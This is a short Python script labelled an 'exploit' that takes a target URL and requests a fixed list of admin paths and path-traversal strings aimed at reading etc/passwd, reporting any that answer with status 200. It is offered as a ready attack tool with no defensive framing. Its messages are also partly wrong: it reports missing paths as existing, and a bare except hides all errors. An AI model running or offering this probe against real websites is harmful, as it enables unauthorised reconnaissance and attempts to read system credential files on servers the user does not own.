import requests

print('''
        Exploit = Website end checker
        Author = Subnetix
        Exemple : exemple.com/
        Note : when you enter the link don't forget to print the "http(s) and the "/"
''')


end_list = ["admin", "login/admin", "passwd", "../../passwd", "etc/passwd", "../etc/passwd", "../../etc/passwd", "../../../etc/passwd", "../../admin", "admin/login"]

target = input("Target : ")

try:
    for value in end_list:
        tar = target + value
        request = requests.get(target + value)
        if request.status_code == 200:
            print("Find end : ", tar)
        else:
            print("End {} does exist ".format(value))

except:
    pass
    